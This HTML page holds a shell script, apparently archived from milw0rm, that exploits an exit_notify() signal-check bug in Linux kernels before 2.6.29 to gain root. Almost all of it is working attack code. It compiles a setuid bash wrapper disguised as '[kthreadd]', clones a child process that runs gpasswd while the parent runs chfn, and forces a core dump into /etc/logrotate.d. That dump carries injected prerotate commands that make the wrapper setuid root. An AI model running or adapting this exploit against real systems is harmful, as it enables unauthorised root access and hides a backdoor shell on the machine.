<html><head><title>Linux Kernel < 2.6.29 exit_notify() Local Privilege Escalation Exploit</title></head><pre>#!/bin/sh

###################################################################################
# gw-notexit.sh: Linux kernel &lt;2.6.29 exit_notify() local root exploit              
# 
# by Milen Rangelov (gat3way-at-gat3way-dot-eu)
#
# Based on 'exit_notify()' CAP_KILL verification bug found by Oleg Nestorov.
# Basically it allows us to send arbitrary signals to a privileged (suidroot)
# parent process. Due to a bad check, the child process with appropriate exit signal
# already set can first execute a suidroot binary then exit() and thus bypass
# in-kernel privilege checks. We use chfn and gpasswd for that purpose.
#
# !!!!!!!!!!!
# Needs /proc/sys/fs/suid_dumpable set to 1 or 2. The default is 0 
# so you'll be out of luck most of the time. 
# So it is not going to be the script kiddies' new killer shit :-)
# !!!!!!!!!!!
#
# if you invent a better way to escalate privileges by sending arbitrary signals to 
# the parent process, please mail me :) That was the best I could think of today :-(
#
# This one made me nostalgic about the prctl(PR_SET_DUMPABLE,2) madness
#
# Skuchna rabota...
#
####################################################################################




SUIDDUMP=`cat /proc/sys/fs/suid_dumpable`
if [ $SUIDDUMP -lt 1 ]; then echo -e &quot;suid_dumpable=0 - system not vulnerable!\n&quot;;exit; fi
if [ -d /etc/logrotate.d ]; then
echo &quot;logrotate installed, that's good!&quot;
else
echo &quot;No logrotate installed, sorry!&quot;;exit
fi

echo -e &quot;Compiling the bash setuid() wrapper...&quot;
cat &gt;&gt; /tmp/.m.c &lt;&lt; EOF
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

int main()
{
    setuid(0);
    execl(&quot;/bin/bash&quot;,&quot;[kthreadd]&quot;,NULL);
}
EOF

cc /tmp/.m.c -o /tmp/.m
rm /tmp/.m.c

echo -e &quot;Compiling the exploit code...&quot;

cat &gt;&gt; /tmp/exploit.c &lt;&lt; EOF
#include &lt;stdio.h&gt;
#include &lt;sched.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

int child(void *data)
{
    sleep(2);
    printf(&quot;I'm gonna kill the suidroot father without having root rights :D\n&quot;);
    execl(&quot;/usr/bin/gpasswd&quot;,&quot;%s&quot;,NULL);
    exit(0);
}

int main()
{
    int stacksize = 4*getpagesize();
    void *stack, *stacktop;
    stack = malloc(stacksize);
    stacktop = stack + stacksize;
    chdir(&quot;/etc/logrotate.d&quot;);
    int p = clone(child, stacktop, CLONE_FILES|SIGSEGV, NULL);
    if (p&gt;0) execl(&quot;/usr/bin/chfn&quot;,&quot;\n/tmp/.a\n{\nsize=0\nprerotate\n\tchown root /tmp/.m;chmod u+s /tmp/.m\nendscript\n}\n\n&quot;,NULL);
}
EOF

cc /tmp/exploit.c -o /tmp/.ex
rm /tmp/exploit.c

echo -e &quot;Setting coredump limits and running the exploit...\n&quot;
ulimit -c 10000
touch /tmp/.a
`/tmp/.ex &gt;/dev/null 2&gt;/dev/null`
sleep 5
rm /tmp/.ex

if [ -e /etc/logrotate.d/core ]; then
echo -e &quot;Successfully coredumped into the logrotate config dir\nNow wait until cron.daily executes logrotate and makes your shell wrapper suid\n&quot;
echo -e &quot;The shell should be located in /tmp/.m - just run /tmp/.m after 24h and you'll be root&quot;
echo -e &quot;\nYour terminal is most probably screwed now, sorry for that...&quot;
exit
fi

echo &quot;The system is not vulnerable, sorry :(&quot;

# milw0rm.com [2009-04-08]</pre></html>